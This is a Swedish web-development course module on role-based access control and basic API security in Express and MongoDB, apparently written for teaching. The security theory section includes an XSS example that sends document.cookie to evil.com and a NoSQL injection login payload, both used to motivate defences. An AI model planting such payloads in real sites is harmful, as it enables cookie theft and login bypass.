- **Authentication:** Anna loggar in → servern vet att det är Anna
- **Authorization:** Anna är admin → Anna får radera posts

---

### Vanliga roller

**User (default):**
- Vanlig användare
- Kan läsa, skapa, uppdatera SINA egna posts
- Kan INTE radera andras posts

**Moderator:**
- Kan moderera innehåll
- Kan radera ANDRAS posts/comments
- Kan INTE ändra användares roller

**Admin:**
- Full kontroll
- Kan radera användare
- Kan ändra roller
- Kan allt som moderators kan

---

## ✏️ Övning 14: Roller & Admin endpoints (50 min)

### Steg 1: Uppdatera User model med role (10 min)

Uppdatera `models/User.mjs`:

```javascript
const userSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: [true, 'Username is required'],
      unique: true,
      trim: true,
      minlength: [3, 'Username must be at least 3 characters'],
      maxlength: [20, 'Username cannot exceed 20 characters']
    },
    email: {
      type: String,
      required: [true, 'Email is required'],
      unique: true,
      trim: true,
      lowercase: true,
      match: [/^\S+@\S+\.\S+$/, 'Please enter a valid email']
    },
    password: {
      type: String,
      required: [true, 'Password is required'],
      minlength: [6, 'Password must be at least 6 characters']
    },
    role: {
      type: String,
      enum: ['user', 'moderator', 'admin'],
      default: 'user'
    }
  },
  {
    timestamps: true
  }
);

// ... resten av User model (pre-save, comparePassword)
```

**Förklaring:**

**enum:**
```javascript
enum: ['user', 'moderator', 'admin']
```
Endast dessa värden är tillåtna.

**default:**
```javascript
default: 'user'
```
Alla nya användare blir 'user' automatiskt.

---

### Steg 2: Role middleware (15 min)

Lägg till i `middleware/auth.mjs`:

```javascript
/**
 * Middleware: Kräver specifik roll
 * @param  {...string} roles - Tillåtna roller
 */
export const requireRole = (...roles) => {
  return (req, res, next) => {
    // requireAuth MÅSTE köras först!
    if (!req.user) {
      return res.status(401).json({
        success: false,
        message: 'Authentication required'
      });
    }
    
    // Kolla om user har någon av de tillåtna rollerna
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        message: `Access denied. Requires role: ${roles.join(' or ')}`
      });
    }
    
    next();
  };
};
```

**Förklaring:**

**Rest parameters (...):**
```javascript
requireRole(...roles)
```
- `requireRole('admin')` → `roles = ['admin']`
- `requireRole('admin', 'moderator')` → `roles = ['admin', 'moderator']`

**Return function:**
```javascript
return (req, res, next) => { ... }
```
Returnerar middleware-funktionen. Detta kallas "higher-order function".

**Användning:**
```javascript
app.delete('/admin/users/:id', requireAuth, requireRole('admin'), handler)
//                              ^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^
//                              Autentisera  Auktorisera
```

**403 Forbidden:**
- 401 = Unauthorized (inte inloggad)
- 403 = Forbidden (inloggad men saknar permission)

---

### Steg 3: Admin endpoints (25 min)

Lägg till i `app.mjs`:

```javascript
import { requireAuth, requireRole } from './middleware/auth.mjs';

/**
 * GET /admin/users - Hämta alla användare
 * KRÄVER: admin role
 */
app.get('/admin/users', requireAuth, requireRole('admin'), async (req, res) => {
  try {
    const users = await User.find()
      .select('-password')
      .sort({ createdAt: -1 });
    
    res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
    
  } catch (error) {
    console.error('Get users error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

/**
 * PATCH /admin/users/:id/role - Ändra användares roll
 * KRÄVER: admin role
 */
app.patch('/admin/users/:id/role', requireAuth, requireRole('admin'), async (req, res) => {
  try {
    const { id } = req.params;
    const { role } = req.body;
    
    // Validera roll
    if (!['user', 'moderator', 'admin'].includes(role)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid role. Must be: user, moderator, or admin'
      });
    }
    
    // Kolla att user finns
    const user = await User.findById(id);
    
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }
    
    // Säkerhet: Kan inte ändra sin egen roll
    if (user._id.toString() === req.user._id.toString()) {
      return res.status(400).json({
        success: false,
        message: 'Cannot change your own role'
      });
    }
    
    // Uppdatera roll
    user.role = role;
    await user.save();
    
    res.status(200).json({
      success: true,
      message: `User role updated to ${role}`,
      data: {
        _id: user._id,
        username: user.username,
        email: user.email,
        role: user.role
      }
    });
    
  } catch (error) {
    console.error('Update role error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

/**
 * DELETE /admin/users/:id - Radera användare
 * KRÄVER: admin role
 */
app.delete('/admin/users/:id', requireAuth, requireRole('admin'), async (req, res) => {
  try {
    const { id } = req.params;
    
    const user = await User.findById(id);
    
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }
    
    // Säkerhet: Kan inte radera sig själv
    if (user._id.toString() === req.user._id.toString()) {
      return res.status(400).json({
        success: false,
        message: 'Cannot delete your own account via admin endpoint'
      });
    }
    
    await User.findByIdAndDelete(id);
    
    res.status(200).json({
      success: true,
      message: 'User deleted successfully'
    });
    
  } catch (error) {
    console.error('Delete user error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});
```

**Förklaring:**

**toString() för ObjectId:**
```javascript
user._id.toString() === req.user._id.toString()
```
MongoDB ObjectId måste konverteras till sträng för jämförelse.

**Säkerhet: Kan inte ändra sin egen roll:**
```javascript
if (user._id.toString() === req.user._id.toString()) {
  return res.status(400).json({
    message: 'Cannot change your own role'
  });
}
```
Förhindrar:
- Admin degradar sig själv av misstag
- Sista admin tar bort sin admin-roll

---

### Steg 4: Testa Role-based Access Control

**Setup:**
1. Skapa 2 användare (signup)
2. Manuellt i MongoDB Atlas: Ändra EN user till admin
   - Database → Collections → users
   - Hitta en user → Edit
   - `role: "admin"`
   - Update
3. Login som admin → spara admin token
4. Login som vanlig user → spara user token

---

**Test 1: Vanlig user försöker komma åt admin endpoint**

```
GET http://localhost:3000/admin/users

Headers:
Authorization: Bearer USER_TOKEN
```

**Response:**
```json
{
  "success": false,
  "message": "Access denied. Requires role: admin"
}
```

**Status:** 403 Forbidden ✅

---

**Test 2: Admin kommer åt endpoint**

```
GET http://localhost:3000/admin/users

Headers:
Authorization: Bearer ADMIN_TOKEN
```

**Response:**
```json
{
  "success": true,
  "count": 2,
  "data": [
    {
      "_id": "...",
      "username": "anna",
      "email": "anna@test.com",
      "role": "admin"
    },
    {
      "_id": "...",
      "username": "bob",
      "email": "bob@test.com",
      "role": "user"
    }
  ]
}
```

**Status:** 200 OK ✅

---

**Test 3: Admin ändrar users roll**

```
PATCH http://localhost:3000/admin/users/BOBS_ID/role

Headers:
Authorization: Bearer ADMIN_TOKEN

Body:
{
  "role": "moderator"
}
```

**Response:**
```json
{
  "success": true,
  "message": "User role updated to moderator",
  "data": {
    "_id": "...",
    "username": "bob",
    "role": "moderator"
  }
}
```

Verifiera i Atlas: Bob är nu moderator! ✅

---

**Test 4: Admin försöker ändra sin egen roll**

```
PATCH http://localhost:3000/admin/users/ANNAS_ID/role

Headers:
Authorization: Bearer ADMIN_TOKEN

Body:
{
  "role": "user"
}
```

**Response:**
```json
{
  "success": false,
  "message": "Cannot change your own role"
}
```

Säkerhet fungerar! ✅

---

### ✅ Kontrollera:
- [ ] User model har role field
- [ ] requireRole middleware fungerar
- [ ] Vanliga users får 403 på admin endpoints
- [ ] Admins kan se alla users
- [ ] Admins kan ändra roller
- [ ] Admins kan radera users (men inte sig själva)
- [ ] Kan inte ändra sin egen roll

---

## 🏠 Hemuppgift (Vecka 8)

**Uppgift:** Bygg Task Management System med roller

**Krav:**

**Models:**
- User (username, email, password, role)
- Task (title, description, status, assignedTo, createdBy)

**Auth endpoints:**
- POST /auth/signup
- POST /auth/login
- GET /auth/me (requireAuth)

**Task endpoints (Users):**
- GET /tasks (bara SINA tasks)
- POST /tasks (skapa task)
- PATCH /tasks/:id (uppdatera SIN task)
- DELETE /tasks/:id (radera SIN task)

**Task endpoints (Admin/Moderator):**
- GET /admin/tasks (ALLA tasks)
- PATCH /admin/tasks/:id/assign (tilldela till user)
- DELETE /admin/tasks/:id (radera VILKEN task som helst)

**Admin endpoints:**
- GET /admin/users
- PATCH /admin/users/:id/role

**Testning:**
- Skapa 3 users (1 admin, 1 moderator, 1 user)
- Testa alla endpoints med olika roller
- Dokumentera i README

---

# 📚 Modul 8: Säkerhet & Best Practices (Vecka 9)

## 🎓 Lärandemål
- Förstå vanliga säkerhetshot
- Implementera säkerhetspaket
- Input sanitization
- Rate limiting

---

## 📖 Teori: Vanliga säkerhetshot (15 min)

### 1. XSS (Cross-Site Scripting)

**Attack:**
User skriver i formulär:
```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

Om detta sparas och visas på sidan → script körs hos ALLA användare!

**Skydd:**
- Sanitize input (ta bort HTML)
- Content Security Policy headers
- HTTPOnly cookies

---

### 2. NoSQL Injection

**Attack:**
```json
{
  "email": { "$gt": "" },
  "password": "anything"
}
```

Kan matcha ALLA emails!

**Skydd:**
- Mongoose schemas (validering)
- Sanitize input (ta bort `$` och `.`)

---

### 3. Brute Force

**Attack:**
Testa tusentals lösenord per sekund:
```
POST /auth/login { password: "test1" }
POST /auth/login { password: "test2" }
... 10000 gånger
```

**Skydd:**
- Rate limiting (max X requests per minut)
- Account lockout efter X misslyckade försök

---

### 4. JWT Theft

**Attack:**
Stjäl JWT från localStorage/cookies

**Skydd:**
- HTTPS endast
- HTTPOnly cookies (om cookie-baserat)
- Kort expiration time
- Refresh tokens

---

## ✏️ Övning 15: Säkerhetspaket (45 min)

### Steg 1: Installera paket (5 min)

```bash
npm install helmet express-mongo-sanitize express-rate-limit
```

**Paket:**
- `helmet`: Sätter säkerhets-headers
- `express-mongo-sanitize`: Förhindrar NoSQL injection
- `express-rate-limit`: Begränsar requests

---

### Steg 2: Helmet (10 min)

I `app.mjs`:

```javascript
import helmet from 'helmet';

const app = express();

// Helmet FÖRST (sätter headers)
app.use(helmet());

// Resten av middleware...
app.use(cors());
app.use(express.json());
```

**Vad gör helmet?**

Sätter säkerhets-headers:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=15552000
```

**Testa:**
Gör en request i Postman → Response Headers tab → Se headers!

---

### Steg 3: Rate Limiting (15 min)

Skapa `middleware/rateLimiter.mjs`:

```javascript
import rateLimit from 'express-rate-limit';

/**
 * General API rate limiter
 */
export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minuter
  max: 100, // Max 100 requests per window
  message: {
    success: false,
    message: 'Too many requests, please try again later.'
  },
  standardHeaders: true,
  legacyHeaders: false
});

/**
 * Auth rate limiter (strängare)
 */
export const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // Max 5 login/signup försök
  message: {
    success: false,
    message: 'Too many authentication attempts, please try again later.'
  },
  skipSuccessfulRequests: true // Räkna bara misslyckade
});
```

**Förklaring:**

**windowMs:**
```javascript
windowMs: 15 * 60 * 1000
//        ^^  ^^  ^^^^
//        15  60  1000ms
//        min sec
```

**skipSuccessfulRequests:**
Om `true`: Räkna bara misslyckade requests (bra för login).

---

**Använd rate limiters i app.mjs:**

```javascript
import { apiLimiter, authLimiter } from './middleware/rateLimiter.mjs';

// General rate limit
app.use('/api', apiLimiter);

// Strängare för auth
app.post('/auth/signup', authLimiter, async (req, res) => { ... });
app.post('/auth/login', authLimiter, async (req, res) => { ... });
```

**Testa:**
Kör POST /auth/login 6 gånger snabbt:

Request 1-5: Normal response  
Request 6: 429 Too Many Requests

```json
{
  "success": false,
  "message": "Too many authentication attempts, please try again later."
}
```

---

### Steg 4: Mongo Sanitize (10 min)

I `app.mjs`:

```javascript
import mongoSanitize from 'express-mongo-sanitize';

app.use(express.json());
app.use(mongoSanitize()); // Efter express.json()
```

**Vad gör det?**

Tar bort `$` och `.` från user input:

**Utan sanitize:**
```json
{
  "email": { "$gt": "" }
}
```
→ Matchar ALLA emails! (NoSQL injection)

**Med sanitize:**
```json
{
  "email": "gt"
}
```
→ Söker efter email "gt" (ofarligt)

---

**Testa:**
```
POST http://localhost:3000/auth/login

Body:
{
  "email": { "$gt": "" },
  "password": "test"
}
```

Med mongoSanitize: 401 Invalid credentials ✅

---

### Steg 5: Input Validation (15 min)

Skapa `utils/validation.mjs`:

```javascript
/**
 * Sanitize text (ta bort HTML tags)
 */
export const sanitizeText = (text) => {
  if (typeof text !== 'string') return text;
  
  // Ta bort HTML tags
  let sanitized = text.replace(/<[^>]*>/g, '');
  
  // Trim whitespace
  sanitized = sanitized.trim();
  
  return sanitized;
};

/**
 * Validera email format
 */
export const isValidEmail = (email) => {
  const emailRegex = /^\S+@\S+\.\S+$/;
  return emailRegex.test(email);
};

/**
 * Validera username
 */
export const isValidUsername = (username) => {
  const usernameRegex = /^[a-zA-Z0-9_]+$/;
  
  if (username.length < 3 || username.length > 20) {
    return { valid: false, message: 'Username must be 3-20 characters' };
  }
  
  if (!usernameRegex.test(username)) {
    return { valid: false, message: 'Username can only contain letters, numbers, and underscores' };
  }
  
  return { valid: true };
};
```

**Använd i signup:**

```javascript
import { sanitizeText, isValidEmail, isValidUsername } from './utils/validation.mjs';

app.post('/auth/signup', authLimiter, async (req, res) => {
  try {
    let { username, email, password } = req.body;
    
    // Sanitize
    username = sanitizeText(username);
    email = sanitizeText(email);
    
    // Validera email
    if (!isValidEmail(email)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid email format'
      });
    }
    
    // Validera username
    const usernameValidation = isValidUsername(username);
    if (!usernameValidation.valid) {
      return res.status(400).json({
        success: false,
        message: usernameValidation.message
      });
    }
    
    // ... resten av signup
  } catch (error) {
    // ...
  }
});
```

---

### ✅ Kontrollera:
- [ ] Helmet sätter säkerhets-headers
- [ ] Rate limiting fungerar (429 efter för många requests)
- [ ] Mongo sanitize tar bort `$` och `.`
- [ ] Input saniteras (HTML tags tas bort)
- [ ] Email och username valideras

---

## 🏠 Hemuppgift (Vecka 9)

**Uppgift:** Security Audit

**Krav:**
1. Implementera alla säkerhetsåtgärder i ditt Task Management System
2. Skriv säkerhetsrapport (1-2 sidor):
   - Vilka hot skyddas mot?
   - Vilka headers sätts av helmet?
   - Hur fungerar rate limiting?
   - Exempel på NoSQL injection attack som blockeras

**Extra utmaning:**
- Implementera account lockout efter 5 misslyckade login
- Lägg till logging av misslyckade login-försök

---

## 💡 Sammanfattning - Period 3

### ✅ Vad du nu kan:

**Autentisering:**
- [x] Hasha lösenord med bcrypt
- [x] Registrera användare
- [x] Logga in användare
- [x] Generera JWT tokens
- [x] Verifiera JWT tokens

**Authorization:**
- [x] Protected routes (requireAuth middleware)
- [x] Role-based access control
- [x] Admin, moderator, user roller

**Säkerhet:**
- [x] Helmet (säkerhets-headers)
- [x] Rate limiting (brute force skydd)
- [x] Mongo sanitize (NoSQL injection skydd)
- [x] Input sanitization
- [x] Validering

---

## 🎯 Koppling till kursplan

**"Grundläggande principer för säkerhet och sätt att identifiera hot och sårbarheter samt grundläggande åtgärder för att motverka attacker":**

✅ Hot identifierade:
- XSS
- NoSQL injection  
- Brute force
- JWT theft

✅ Åtgärder implementerade:
- helmet
- rate limiting
- sanitization
- bcrypt
- JWT

---

## 📚 Nästa steg: Period 4

**Frontend Integration med Vite (Vecka 10-12)**

Du är nu redo att bygga en frontend som pratar med ditt API!

Se fil: `period-4-frontend-vite.md`

---

**Bra jobbat! 🎉**
